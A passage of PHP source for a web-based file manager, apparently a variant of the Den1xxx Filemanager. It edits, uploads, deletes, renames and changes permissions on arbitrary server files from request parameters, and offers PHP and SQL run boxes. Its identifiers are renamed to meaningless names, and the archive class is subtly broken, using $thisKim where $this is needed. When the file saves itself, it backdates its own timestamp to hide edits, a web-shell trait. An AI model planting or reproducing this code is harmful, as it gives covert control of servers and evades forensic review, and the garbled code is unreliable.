	$selectOffice = '<select name="'.$cartelResponseLanguage.'_tpl" title="'.__('Template').'" onchange="if (this.value!=-1) document.forms[\'console\'].elements[\''.$cartelResponseLanguage.'\'].value = this.options[selectedIndex].value; else document.forms[\'console\'].elements[\''.$cartelResponseLanguage.'\'].value =\'\';" >'."\n";


	$selectOffice .= '<option value="-1">' . __('Select') . "</option>\n";
	foreach ($legalTemplate as $goodmanKey=>$goodmanValue){



		$selectOffice.='<option value="'.$goodmanValue.'" '.((!empty($goodmanValue)&&($goodmanValue==$cinnabonActive))?'selected':'').' >'.__($goodmanKey)."</option>\n";
	}


	$selectOffice .= "</select>\n";
	echo $selectOffice;


}


?>
		</form>
	</td>


</tr>
</table>
<?php

	if (!empty($goodmanResult)) {
		$howardCallback='fm_'.$cartelResponseLanguage;
		echo '<h3>'.strtoupper($cartelResponseLanguage).' '.__('Result').'</h3><pre>'.$howardCallback($goodmanResult).'</pre>';

	}

} elseif (!empty($_REQUEST['edit'])){



	if(!empty($_REQUEST['save'])) {


		$saulFunction = $mcgillPath . $_REQUEST['edit'];



		$mesaFileModified = filemtime($saulFunction);
	    if (file_put_contents($saulFunction, $_REQUEST['newcontent'])) $kimMessage .= __('File updated');
		else $kimMessage .= __('Error occurred');
		if ($_GET['edit']==basename(__FILE__)) {


			touch(__FILE__,1415116371);


		} else {
			if (!empty($officeConfig['restore_time'])) touch($saulFunction,$mesaFileModified);


		}
	}

    $oldCaseContent = @file_get_contents($mcgillPath . $_REQUEST['edit']);
    $editJimmyUrl = $includedKimUrl . '&edit=' . $_REQUEST['edit'] . '&path=' . $mcgillPath;



    $nachoPrevUrl = $includedKimUrl . '&path=' . $mcgillPath;

?>
<table border='0' cellspacing='0' cellpadding='1' width="100%">


<tr>
    <th><?=__('File manager').' - '.__('Edit').' - '.$mcgillPath.$_REQUEST['edit']?></th>
</tr>
<tr>
    <td class="row1">
        <?=$kimMessage?>


	</td>

</tr>


<tr>
    <td class="row1">


        <?=goodmanHome()?> <a href="<?=$nachoPrevUrl?>"><?=__('Back')?></a>


	</td>
</tr>
<tr>

    <td class="row1" align="center">



        <form name="form1" method="post" action="<?=$editJimmyUrl?>">


            <textarea name="newcontent" id="newcontent" cols="45" rows="15" style="width:99%" spellcheck="false"><?=htmlspecialchars($oldCaseContent)?></textarea>
            <input type="submit" name="save" value="<?=__('Submit')?>">
            <input type="submit" name="cancel" value="<?=__('Cancel')?>">


        </form>



    </td>
</tr>


</table>
<?php


echo $howardVerified['script'];
} elseif(!empty($_REQUEST['rights'])){


	if(!empty($_REQUEST['save'])) {
	    if(kimChangePermissions($mcgillPath . $_REQUEST['rights'], convertCartelPermissions($_REQUEST['rights_val']), @$_REQUEST['recursively']))
		$kimMessage .= (__('File updated')); 

		else $kimMessage .= (__('Error occurred'));
	}



	clearstatcache();
    $oldLaloPermissions = permissionsCartelString($mcgillPath . $_REQUEST['rights'], true);

    $goodmanLink = $includedKimUrl . '&rights=' . $_REQUEST['rights'] . '&path=' . $mcgillPath;

    $nachoPrevUrl = $includedKimUrl . '&path=' . $mcgillPath;



?>
<table class="whole">



<tr>


    <th><?=__('File manager').' - '.$mcgillPath?></th>



</tr>


<tr>



    <td class="row1">
        <?=$kimMessage?>
	</td>
</tr>

<tr>
    <td class="row1">
        <a href="<?=$nachoPrevUrl?>"><?=__('Back')?></a>
	</td>

</tr>
<tr>



    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$goodmanLink?>">
           <?=__('Rights').' - '.$_REQUEST['rights']?> <input type="text" name="rights_val" value="<?=$oldLaloPermissions?>">
        <?php if (is_dir($mcgillPath.$_REQUEST['rights'])) { ?>


            <input type="checkbox" name="recursively" value="1"> <?=__('Recursively')?><br/>

        <?php } ?>
            <input type="submit" name="save" value="<?=__('Submit')?>">
        </form>


    </td>

</tr>
</table>
<?php


} elseif (!empty($_REQUEST['rename'])&&$_REQUEST['rename']<>'.') {


	if(!empty($_REQUEST['save'])) {

	    rename($mcgillPath . $_REQUEST['rename'], $mcgillPath . $_REQUEST['newname']);
		$kimMessage .= (__('File updated'));
		$_REQUEST['rename'] = $_REQUEST['newname'];



	}

	clearstatcache();



    $goodmanLink = $includedKimUrl . '&rename=' . $_REQUEST['rename'] . '&path=' . $mcgillPath;

    $nachoPrevUrl = $includedKimUrl . '&path=' . $mcgillPath;





?>
<table class="whole">



<tr>
    <th><?=__('File manager').' - '.$mcgillPath?></th>

</tr>
<tr>
    <td class="row1">
        <?=$kimMessage?>
	</td>
</tr>



<tr>
    <td class="row1">
        <a href="<?=$nachoPrevUrl?>"><?=__('Back')?></a>

	</td>
</tr>

<tr>
    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$goodmanLink?>">


            <?=__('Rename')?>: <input type="text" name="newname" value="<?=$_REQUEST['rename']?>"><br/>
            <input type="submit" name="save" value="<?=__('Submit')?>">
        </form>
    </td>
</tr>


</table>



<?php
} else {



//Let's rock!
    $kimMessage = '';
    if(!empty($_FILES['upload'])&&!empty($officeConfig['upload_file'])) {
        if(!empty($_FILES['upload']['name'])){



            $_FILES['upload']['name'] = str_replace('%', '', $_FILES['upload']['name']);
            if(!move_uploaded_file($_FILES['upload']['tmp_name'], $mcgillPath . $_FILES['upload']['name'])){
                $kimMessage .= __('Error occurred');
            } else {
				$kimMessage .= __('Files uploaded').': '.$_FILES['upload']['name'];

			}

        }

    } elseif(!empty($_REQUEST['delete'])&&$_REQUEST['delete']<>'.') {
        if(!deleteLaloFiles(($mcgillPath . $_REQUEST['delete']), true)) {

            $kimMessage .= __('Error occurred');
        } else {

			$kimMessage .= __('Deleted').' '.$_REQUEST['delete'];



		}

	} elseif(!empty($_REQUEST['mkdir'])&&!empty($officeConfig['make_directory'])) {



        if(!@mkdir($mcgillPath . $_REQUEST['dirname'],0777)) {
            $kimMessage .= __('Error occurred');



        } else {
			$kimMessage .= __('Created').' '.$_REQUEST['dirname'];



		}


    } elseif(!empty($_REQUEST['mkfile'])&&!empty($officeConfig['new_file'])) {



        if(!$mcgillPointer=@fopen($mcgillPath . $_REQUEST['filename'],"w")) {
            $kimMessage .= __('Error occurred');



        } else {
			fclose($mcgillPointer);
			$kimMessage .= __('Created').' '.$_REQUEST['filename'];


		}
    } elseif (isset($_GET['zip'])) {


		$sourceGoodman = base64_decode($_GET['zip']);



		$sandpiperDestination = basename($sourceGoodman).'.zip';
		set_time_limit(0);

		$laloPhar = new PharData($sandpiperDestination);



		$laloPhar->buildFromDirectory($sourceGoodman);
		if (is_file($sandpiperDestination))



		$kimMessage .= __('Task').' "'.__('Archiving').' '.$sandpiperDestination.'" '.__('done').
		'.&nbsp;'.mainGoodmanLink('download',$mcgillPath.$sandpiperDestination,__('Download'),__('Download').' '. $sandpiperDestination)
		.'&nbsp;<a href="'.$includedKimUrl.'&delete='.$sandpiperDestination.'&path=' . $mcgillPath.'" title="'.__('Delete').' '. $sandpiperDestination.'" >'.__('Delete') . '</a>';
		else $kimMessage .= __('Error occurred').': '.__('no files');


	} elseif (isset($_GET['gz'])) {
		$sourceGoodman = base64_decode($_GET['gz']);

		$mcgillArchive = $sourceGoodman.'.tar';
		$sandpiperDestination = basename($sourceGoodman).'.tar';

		if (is_file($mcgillArchive)) unlink($mcgillArchive);


		if (is_file($mcgillArchive.'.gz')) unlink($mcgillArchive.'.gz');


		clearstatcache();
		set_time_limit(0);
		//die();


		$laloPhar = new PharData($sandpiperDestination);

		$laloPhar->buildFromDirectory($sourceGoodman);

		$laloPhar->compress(Phar::GZ,'.tar.gz');


		unset($laloPhar);


		if (is_file($mcgillArchive)) {
			if (is_file($mcgillArchive.'.gz')) {


				unlink($mcgillArchive); 
				$sandpiperDestination .= '.gz';



			}

			$kimMessage .= __('Task').' "'.__('Archiving').' '.$sandpiperDestination.'" '.__('done').
			'.&nbsp;'.mainGoodmanLink('download',$mcgillPath.$sandpiperDestination,__('Download'),__('Download').' '. $sandpiperDestination)
			.'&nbsp;<a href="'.$includedKimUrl.'&delete='.$sandpiperDestination.'&path=' . $mcgillPath.'" title="'.__('Delete').' '.$sandpiperDestination.'" >'.__('Delete').'</a>';

		} else $kimMessage .= __('Error occurred').': '.__('no files');

	} elseif (isset($_GET['decompress'])) {
		// $sourceGoodman = base64_decode($_GET['decompress']);



		// $sandpiperDestination = basename($sourceGoodman);
		// $saulExtension = end(explode(".", $sandpiperDestination));


		// if ($saulExtension=='zip' OR $saulExtension=='gz') {
			// $laloPhar = new PharData($sourceGoodman);

			// $laloPhar->decompress();
			// $cinnabonMainFile = str_replace('.'.$saulExtension,'',$sandpiperDestination);

			// $saulExtension = end(explode(".", $cinnabonMainFile));


			// if ($saulExtension=='tar'){
				// $laloPhar = new PharData($cinnabonMainFile);
				// $laloPhar->extractTo(dir($sourceGoodman));



			// }
		// } 



		// $kimMessage .= __('Task').' "'.__('Decompress').' '.$sourceGoodman.'" '.__('done');


	} elseif (isset($_GET['gzfile'])) {


		$sourceGoodman = base64_decode($_GET['gzfile']);
		$mcgillArchive = $sourceGoodman.'.tar';



		$sandpiperDestination = basename($sourceGoodman).'.tar';


		if (is_file($mcgillArchive)) unlink($mcgillArchive);


		if (is_file($mcgillArchive.'.gz')) unlink($mcgillArchive.'.gz');
		set_time_limit(0);

		//echo $sandpiperDestination;
		$goodmanExtensions = explode('.',basename($sourceGoodman));


		if (isset($goodmanExtensions[1])) {



			unset($goodmanExtensions[0]);


			$saulExtension=implode('.',$goodmanExtensions);
		} 

		$laloPhar = new PharData($sandpiperDestination);
		$laloPhar->addFile($sourceGoodman);

		$laloPhar->compress(Phar::GZ,$saulExtension.'.tar.gz');
		unset($laloPhar);


		if (is_file($mcgillArchive)) {



			if (is_file($mcgillArchive.'.gz')) {


				unlink($mcgillArchive); 
				$sandpiperDestination .= '.gz';
			}
			$kimMessage .= __('Task').' "'.__('Archiving').' '.$sandpiperDestination.'" '.__('done').



			'.&nbsp;'.mainGoodmanLink('download',$mcgillPath.$sandpiperDestination,__('Download'),__('Download').' '. $sandpiperDestination)
			.'&nbsp;<a href="'.$includedKimUrl.'&delete='.$sandpiperDestination.'&path=' . $mcgillPath.'" title="'.__('Delete').' '.$sandpiperDestination.'" >'.__('Delete').'</a>';

		} else $kimMessage .= __('Error occurred').': '.__('no files');


	}
?>


<table class="whole" id="header_table" >


<tr>

    <th colspan="2"><?=__('File manager')?><?=(!empty($mcgillPath)?' - '.$mcgillPath:'')?></th>

</tr>
<?php if(!empty($kimMessage)){ ?>


<tr>

	<td colspan="2" class="row2"><?=$kimMessage?></td>
</tr>
<?php } ?>


<tr>
    <td class="row2">
		<table>
			<tr>


			<td>


				<?=goodmanHome()?>



			</td>


			<td>



			<?php if(!empty($officeConfig['make_directory'])) { ?>
				<form method="post" action="<?=$includedKimUrl?>">
				<input type="hidden" name="path" value="<?=$mcgillPath?>" />

				<input type="text" name="dirname" size="15">
				<input type="submit" name="mkdir" value="<?=__('Make directory')?>">
				</form>
			<?php } ?>

			</td>
			<td>
			<?php if(!empty($officeConfig['new_file'])) { ?>
				<form method="post" action="<?=$includedKimUrl?>">


				<input type="hidden" name="path" value="<?=$mcgillPath?>" />
				<input type="text" name="filename" size="15">



				<input type="submit" name="mkfile" value="<?=__('New file')?>">
				</form>
			<?php } ?>
			</td>
			<td>
			<?=runOfficeInput('php')?>
			</td>
			<td>
			<?=runOfficeInput('sql')?>
			</td>
			</tr>
		</table>



    </td>
    <td class="row3">
		<table>
		<tr>



		<td>
		<?php if (!empty($officeConfig['upload_file'])) { ?>


			<form name="form1" method="post" action="<?=$includedKimUrl?>" enctype="multipart/form-data">

			<input type="hidden" name="path" value="<?=$mcgillPath?>" />


			<input type="file" name="upload" id="upload_hidden" style="position: absolute; display: block; overflow: hidden; width: 0; height: 0; border: 0; padding: 0;" onchange="document.getElementById('upload_visible').value = this.value;" />
			<input type="text" readonly="1" id="upload_visible" placeholder="<?=__('Select the file')?>" style="cursor: pointer;" onclick="document.getElementById('upload_hidden').click();" />



			<input type="submit" name="test" value="<?=__('Upload')?>" />

			</form>
		<?php } ?>



		</td>

		<td>

		<?php if ($howardVerified['authorize']) { ?>
			<form action="" method="post">&nbsp;&nbsp;&nbsp;

			<input name="quit" type="hidden" value="1">
			<?=__('Hello')?>, <?=$howardVerified['login']?>


			<input type="submit" value="<?=__('Quit')?>">

			</form>
		<?php } ?>
		</td>


		<td>



		<?=documentLanguageForm($documentLanguage)?>
		</td>


		<tr>
		</table>
    </td>

</tr>

</table>


<table class="all" border='0' cellspacing='1' cellpadding='1' id="fm_table" width="100%">
<thead>


<tr> 



    <th style="white-space:nowrap"> <?=__('Filename')?> </th>
    <th style="white-space:nowrap"> <?=__('Size')?> </th>


    <th style="white-space:nowrap"> <?=__('Date')?> </th>
    <th style="white-space:nowrap"> <?=__('Rights')?> </th>


    <th colspan="4" style="white-space:nowrap"> <?=__('Manage')?> </th>
</tr>
</thead>

<tbody>
<?php
$legalElements = scanGoodmanDirectory($mcgillPath, '', 'all', true);



$saulDirectories = array();


$cartelFiles = array();
foreach ($legalElements as $mcgillFile){
    if(@is_dir($mcgillPath . $mcgillFile)){
        $saulDirectories[] = $mcgillFile;

    } else {

        $cartelFiles[] = $mcgillFile;

    }


}



natsort($saulDirectories); natsort($cartelFiles);
$legalElements = array_merge($saulDirectories, $cartelFiles);

foreach ($legalElements as $mcgillFile){
    $nachoFilename = $mcgillPath . $mcgillFile;



    $goodmanFileData = @stat($nachoFilename);


    if(@is_dir($nachoFilename)){

		$goodmanFileData[7] = '';



		if (!empty($officeConfig['show_dir_size'])&&!cinnabonRootDirectory($mcgillFile)) $goodmanFileData[7] = calculateOfficeDirectorySize($nachoFilename);


        $goodmanLink = '<a href="'.$includedKimUrl.'&path='.$mcgillPath.$mcgillFile.'" title="'.__('Show').' '.$mcgillFile.'"><span class="folder">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$mcgillFile.'</a>';
        $loadWexlerUrl= (cinnabonRootDirectory($mcgillFile)||$maybeChuckPhar) ? '' : mainGoodmanLink('zip',$nachoFilename,__('Compress').'&nbsp;zip',__('Archiving').' '. $mcgillFile);



		$wexlerArchiveUrl  = (cinnabonRootDirectory($mcgillFile)||$maybeChuckPhar) ? '' : mainGoodmanLink('gz',$nachoFilename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '.$mcgillFile);
        $kimStyle = 'row2';
		 if (!cinnabonRootDirectory($mcgillFile)) $salamancaWarning = 'onClick="if(confirm(\'' . __('Are you sure you want to delete this directory (recursively)?').'\n /'. $mcgillFile. '\')) document.location.href = \'' . $includedKimUrl . '&delete=' . $mcgillFile . '&path=' . $mcgillPath  . '\'"'; else $salamancaWarning = '';


    } else {



		$goodmanLink = 
			$officeConfig['show_img']&&@getimagesize($nachoFilename) 


			? '<a target="_blank" onclick="var lefto = screen.availWidth/2-320;window.open(\''


			. goodmanImageUrl($nachoFilename)



			.'\',\'popup\',\'width=640,height=480,left=\' + lefto + \',scrollbars=yes,toolbar=no,location=no,directories=no,status=no\');return false;" href="'.goodmanImageUrl($nachoFilename).'"><span class="img">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$mcgillFile.'</a>'
			: '<a href="' . $includedKimUrl . '&edit=' . $mcgillFile . '&path=' . $mcgillPath. '" title="' . __('Edit') . '"><span class="file">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$mcgillFile.'</a>';



		$dangerArray = explode(".", $mcgillFile);

		$saulExtension = end($dangerArray);
        $loadWexlerUrl =  mainGoodmanLink('download',$nachoFilename,__('Download'),__('Download').' '. $mcgillFile);


		$wexlerArchiveUrl = in_array($saulExtension,array('zip','gz','tar')) 

		? ''
		: ((cinnabonRootDirectory($mcgillFile)||$maybeChuckPhar) ? '' : mainGoodmanLink('gzfile',$nachoFilename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '. $mcgillFile));


        $kimStyle = 'row1';
		$salamancaWarning = 'onClick="if(confirm(\''. __('File selected').': \n'. $mcgillFile. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'' . $includedKimUrl . '&delete=' . $mcgillFile . '&path=' . $mcgillPath  . '\'"';


    }
    $laloDeleteUrl = cinnabonRootDirectory($mcgillFile) ? '' : '<a href="#" title="' . __('Delete') . ' '. $mcgillFile . '" ' . $salamancaWarning . '>' . __('Delete') . '</a>';

    $renameKimUrl = cinnabonRootDirectory($mcgillFile) ? '' : '<a href="' . $includedKimUrl . '&rename=' . $mcgillFile . '&path=' . $mcgillPath . '" title="' . __('Rename') .' '. $mcgillFile . '">' . __('Rename') . '</a>';

    $cartelPermissionsText = ($mcgillFile=='.' || $mcgillFile=='..') ? '' : '<a href="' . $includedKimUrl . '&rights=' . $mcgillFile . '&path=' . $mcgillPath . '" title="' . __('Rights') .' '. $mcgillFile . '">' . @permissionsCartelString($nachoFilename) . '</a>';
?>
<tr class="<?=$kimStyle?>"> 


    <td><?=$goodmanLink?></td>
    <td><?=$goodmanFileData[7]?></td>
    <td style="white-space:nowrap"><?=gmdate("Y-m-d H:i:s",$goodmanFileData[9])?></td>


    <td><?=$cartelPermissionsText?></td>
    <td><?=$laloDeleteUrl?></td>
    <td><?=$renameKimUrl?></td>
    <td><?=$loadWexlerUrl?></td>
    <td><?=$wexlerArchiveUrl?></td>
</tr>
<?php
    }



}



?>


</tbody>


</table>


<div class="row3"><?php
	$caseModifiedTime = explode(' ', microtime()); 
	$totalCaseTime = $caseModifiedTime[0] + $caseModifiedTime[1] - $startCaseTime; 

	echo goodmanHome().' | ver. '.$goodmanVersion.' | <a href="https://github.com/Den1xxx/Filemanager">Github</a>  | <a href="'.goodmanSiteUrl().'">.</a>';
	if (!empty($officeConfig['show_php_ver'])) echo ' | PHP '.phpversion();
	if (!empty($officeConfig['show_php_ini'])) echo ' | '.php_ini_loaded_file();
	if (!empty($officeConfig['show_gt'])) echo ' | '.__('Generation time').': '.round($totalCaseTime,2);


	if (!empty($officeConfig['enable_proxy'])) echo ' | <a href="?proxy=true">proxy</a>';


	if (!empty($officeConfig['show_phpinfo'])) echo ' | <a href="?phpinfo=true">phpinfo</a>';


	if (!empty($officeConfig['show_xls'])&&!empty($goodmanLink)) echo ' | <a href="javascript: void(0)" onclick="var obj = new table2Excel(); obj.CreateExcelSheet(\'fm_table\',\'export\');" title="'.__('Download').' xls">xls</a>';


	if (!empty($officeConfig['fm_settings'])) echo ' | <a href="?fm_settings=true">'.__('Settings').'</a>';
	?>
</div>


<script type="text/javascript">
function downloadCaseExcel(filename, text) {

	var element = document.createElement('a');


	element.setAttribute('href', 'data:application/vnd.ms-excel;base64,' + text);
	element.setAttribute('download', filename);


	element.style.display = 'none';


	document.body.appendChild(element);
	element.click();



	document.body.removeChild(element);


}

function base64_encode(m) {
	for (var k = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split(""), c, d, h, e, a, g = "", b = 0, f, l = 0; l < m.length; ++l) {
		c = m.charCodeAt(l);
		if (128 > c) d = 1;


		else
			for (d = 2; c >= 2 << 5 * d;) ++d;
		for (h = 0; h < d; ++h) 1 == d ? e = c : (e = h ? 128 : 192, a = d - 2 - 6 * h, 0 <= a && (e += (6 <= a ? 1 : 0) + (5 <= a ? 2 : 0) + (4 <= a ? 4 : 0) + (3 <= a ? 8 : 0) + (2 <= a ? 16 : 0) + (1 <= a ? 32 : 0), a -= 5), 0 > a && (u = 6 * (d - 1 - h), e += c >> u, c -= c >> u << u)), f = b ? f << 6 - b : 0, b += 2, f += e >> b, g += k[f], f = e % (1 << b), 6 == b && (b = 0, g += k[f])
	}

	b && (g += k[f << 6 - b]);


	return g
}


var tableToExcelData = (function() {
    var uri = 'data:application/vnd.ms-excel;base64,',



    template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines></x:DisplayGridlines></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--><meta http-equiv="content-type" content="text/plain; charset=UTF-8"/></head><body><table>{table}</table></body></html>',
    format = function(s, c) {
            return s.replace(/{(\w+)}/g, function(m, p) {

                return c[p];



            })
        }
    return function(table, name) {

        if (!table.nodeType) table = document.getElementById(table)

        var ctx = {
            worksheet: name || 'Worksheet',

            table: table.innerHTML.replace(/<span(.*?)\/span> /g,"").replace(/<a\b[^>]*>(.*?)<\/a>/g,"$1")
        }


		t = new Date();
		filename = 'fm_' + t.toISOString() + '.xls'

		downloadCaseExcel(filename, base64_encode(format(template, ctx)))
    }
})();

var table2Excel = function () {




    var ua = window.navigator.userAgent;
    var msie = ua.indexOf("MSIE ");


	this.CreateExcelSheet = 


		function(el, name){

			if (msie > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./)) {// If Internet Explorer






				var x = document.getElementById(el).rows;



				var xls = new ActiveXObject("Excel.Application");

				xls.visible = true;
				xls.Workbooks.Add
				for (i = 0; i < x.length; i++) {


					var y = x[i].cells;





					for (j = 0; j < y.length; j++) {



						xls.Cells(i + 1, j + 1).Value = y[j].innerText;


					}
				}
				xls.Visible = true;



				xls.UserControl = true;
				return xls;
			} else {
				tableToExcelData(el, name);



			}
		}



}

</script>

</body>


</html>





<?php

//Ported from ReloadCMS project http://reloadcms.com
class archiveTar {


	var $saulArchiveName = '';
	var $tmpKimFile = 0;
	var $laloFilePosition = 0;
	var $isSaulZipped = true;
	var $goodmanErrors = array();


	var $cartelFiles = array();



	



	function __construct(){


		if (!isset($thisKim->errors)) $thisKim->errors = array();


	}
	
	function createCaseBackup($howardFileList){


		$caseResult = false;
		if (file_exists($thisKim->archive_name) && is_file($thisKim->archive_name)) 	$newCaseBackup = false;



		else $newCaseBackup = true;

		if ($newCaseBackup){
			if (!$thisKim->openGoodmanWrite()) return false;
		} else {
			if (filesize($thisKim->archive_name) == 0)	return $thisKim->openGoodmanWrite();
			if ($thisKim->isGzipped) {



				$thisKim->closeKimTempFile();

				if (!rename($thisKim->archive_name, $thisKim->archive_name.'.tmp')){
					$thisKim->errors[] = __('Cannot rename').' '.$thisKim->archive_name.__(' to ').$thisKim->archive_name.'.tmp';
					return false;
				}



				$tmpCaseBackup = gzopen($thisKim->archive_name.'.tmp', 'rb');


				if (!$tmpCaseBackup){

					$thisKim->errors[] = $thisKim->archive_name.'.tmp '.__('is not readable');
					rename($thisKim->archive_name.'.tmp', $thisKim->archive_name);



					return false;



				}
				if (!$thisKim->openGoodmanWrite()){

					rename($thisKim->archive_name.'.tmp', $thisKim->archive_name);
					return false;

				}
				$laloBuffer = gzread($tmpCaseBackup, 512);
				if (!gzeof($tmpCaseBackup)){
					do {

						$kettlemanBinary = pack('a512', $laloBuffer);
						$thisKim->writeGoodmanBlock($kettlemanBinary);

						$laloBuffer = gzread($tmpCaseBackup, 512);



					}
					while (!gzeof($tmpCaseBackup));
				}


				gzclose($tmpCaseBackup);
				unlink($thisKim->archive_name.'.tmp');


			} else {



				$thisKim->tmp_file = fopen($thisKim->archive_name, 'r+b');
				if (!$thisKim->tmp_file)	return false;



			}

		}

		if (isset($howardFileList) && is_array($howardFileList)) {
		if (count($howardFileList)>0)

			$caseResult = $thisKim->packKimFiles($howardFileList);
		} else $thisKim->errors[] = __('No file').__(' to ').__('Archive');


		if (($caseResult)&&(is_resource($thisKim->tmp_file))){



			$kettlemanBinary = pack('a512', '');
			$thisKim->writeGoodmanBlock($kettlemanBinary);
		}
		$thisKim->closeKimTempFile();
		if ($newCaseBackup && !$caseResult){
		$thisKim->closeKimTempFile();



		unlink($thisKim->archive_name);



		}

		return $caseResult;
	}




	function restoreCaseBackup($mcgillPath){
		$saulFileName = $thisKim->archive_name;
		if (!$thisKim->isGzipped){



			if (file_exists($saulFileName)){



				if ($mcgillPointer = fopen($saulFileName, 'rb')){


					$mesaData = fread($mcgillPointer, 2);



					fclose($mcgillPointer);



					if ($mesaData == '\37\213'){


						$thisKim->isGzipped = true;


					}
				}


			}


			elseif ((substr($saulFileName, -2) == 'gz') OR (substr($saulFileName, -3) == 'tgz')) $thisKim->isGzipped = true;
		} 
		$caseResult = true;
		if ($thisKim->isGzipped) $thisKim->tmp_file = gzopen($saulFileName, 'rb');
		else $thisKim->tmp_file = fopen($saulFileName, 'rb');

		if (!$thisKim->tmp_file){
			$thisKim->errors[] = $saulFileName.' '.__('is not readable');



			return false;



		}
		$caseResult = $thisKim->unpackSaulFiles($mcgillPath);
			$thisKim->closeKimTempFile();
		return $caseResult;


	}



	function showGoodmanMistakes	($nachoMessage = '') {



		$goodmanProblems = $thisKim->errors;
		if(count($goodmanProblems)>0) {

		if (!empty($nachoMessage)) $nachoMessage = ' ('.$nachoMessage.')';



			$nachoMessage = __('Error occurred').$nachoMessage.': <br/>';

			foreach ($goodmanProblems as $goodmanValue)


				$nachoMessage .= $goodmanValue.'<br/>';
			return $nachoMessage;	



		} else return '';
		
	}
	


	function packKimFiles($goodmanFiles){
		$caseResult = true;

		if (!$thisKim->tmp_file){

			$thisKim->errors[] = __('Invalid file descriptor');


			return false;
		}



		if (!is_array($goodmanFiles) || count($goodmanFiles)<=0)



          return true;



		for ($huellI = 0; $huellI<count($goodmanFiles); $huellI++){
			$nachoFilename = $goodmanFiles[$huellI];



			if ($nachoFilename == $thisKim->archive_name)
				continue;


			if (strlen($nachoFilename)<=0)
				continue;


			if (!file_exists($nachoFilename)){


				$thisKim->errors[] = __('No file').' '.$nachoFilename;
				continue;
			}


			if (!$thisKim->tmp_file){

			$thisKim->errors[] = __('Invalid file descriptor');
			return false;
			}
		if (strlen($nachoFilename)<=0){

			$thisKim->errors[] = __('Filename').' '.__('is incorrect');;
			return false;

		}
		$nachoFilename = str_replace('\\', '/', $nachoFilename);
		$keepNameBuddy = $thisKim->sanitizeKimPath($nachoFilename);
		if (is_file($nachoFilename)){
			if (($mcgillFile = fopen($nachoFilename, 'rb')) == 0){



				$thisKim->errors[] = __('Mode ').__('is incorrect');



			}
				if(($thisKim->file_pos == 0)){

					if(!$thisKim->writeKimHeader($nachoFilename, $keepNameBuddy))



						return false;
				}


				while (($laloBuffer = fread($mcgillFile, 512)) != ''){
					$kettlemanBinary = pack('a512', $laloBuffer);
					$thisKim->writeGoodmanBlock($kettlemanBinary);
				}



			fclose($mcgillFile);
		}	else $thisKim->writeKimHeader($nachoFilename, $keepNameBuddy);



			if (@is_dir($nachoFilename)){


				if (!($saulHandle = opendir($nachoFilename))){


					$thisKim->errors[] = __('Error').': '.__('Directory ').$nachoFilename.__('is not readable');

					continue;


				}
				while (false !== ($saulDirectory = readdir($saulHandle))){
					if ($saulDirectory!='.' && $saulDirectory!='..'){



						$saulTempFiles = array();
						if ($nachoFilename != '.')


							$saulTempFiles[] = $nachoFilename.'/'.$saulDirectory;

						else
							$saulTempFiles[] = $saulDirectory;

						$caseResult = $thisKim->packKimFiles($saulTempFiles);
					}
				}


				unset($saulTempFiles);
				unset($saulDirectory);

				unset($saulHandle);


			}


		}

		return $caseResult;
	}

	function unpackSaulFiles($mcgillPath){ 
		$mcgillPath = str_replace('\\', '/', $mcgillPath);
		if ($mcgillPath == ''	|| (substr($mcgillPath, 0, 1) != '/' && substr($mcgillPath, 0, 3) != '../' && !strpos($mcgillPath, ':')))	$mcgillPath = './'.$mcgillPath;
		clearstatcache();

		while (strlen($kettlemanBinary = $thisKim->readKimBlock()) != 0){
			if (!$thisKim->readMcgillHeader($kettlemanBinary, $kimHeader)) return false;

			if ($kimHeader['filename'] == '') continue;
			if ($kimHeader['typeflag'] == 'L'){			//reading long header
				$nachoFilename = '';



				$decodedKim = floor($kimHeader['size']/512);


				for ($huellI = 0; $huellI < $decodedKim; $huellI++){


					$saulContent = $thisKim->readKimBlock();
					$nachoFilename .= $saulContent;


				}



				if (($lastPieceOfCase = $kimHeader['size'] % 512) != 0){
					$saulContent = $thisKim->readKimBlock();
					$nachoFilename .= substr($saulContent, 0, $lastPieceOfCase);



				}


				$kettlemanBinary = $thisKim->readKimBlock();

				if (!$thisKim->readMcgillHeader($kettlemanBinary, $kimHeader)) return false;
				else $kimHeader['filename'] = $nachoFilename;

				return true;
			}
			if (($mcgillPath != './') && ($mcgillPath != '/')){



				while (substr($mcgillPath, -1) == '/') $mcgillPath = substr($mcgillPath, 0, strlen($mcgillPath)-1);



				if (substr($kimHeader['filename'], 0, 1) == '/') $kimHeader['filename'] = $mcgillPath.$kimHeader['filename'];
				else $kimHeader['filename'] = $mcgillPath.'/'.$kimHeader['filename'];
			}
			



			if (file_exists($kimHeader['filename'])){
				if ((@is_dir($kimHeader['filename'])) && ($kimHeader['typeflag'] == '')){

					$thisKim->errors[] =__('File ').$kimHeader['filename'].__(' already exists').__(' as folder');

					return false;
				}
				if ((is_file($kimHeader['filename'])) && ($kimHeader['typeflag'] == '5')){
					$thisKim->errors[] =__('Cannot create directory').'. '.__('File ').$kimHeader['filename'].__(' already exists');


					return false;


				}
				if (!is_writeable($kimHeader['filename'])){
					$thisKim->errors[] = __('Cannot write to file').'. '.__('File ').$kimHeader['filename'].__(' already exists');
					return false;

				}

			} elseif (($thisKim->checkKimDirectory(($kimHeader['typeflag'] == '5' ? $kimHeader['filename'] : dirname($kimHeader['filename'])))) != 1){


				$thisKim->errors[] = __('Cannot create directory').' '.__(' for ').$kimHeader['filename'];

				return false;
			}



			if ($kimHeader['typeflag'] == '5'){



				if (!file_exists($kimHeader['filename']))		{


					if (!mkdir($kimHeader['filename'], 0777))	{

						



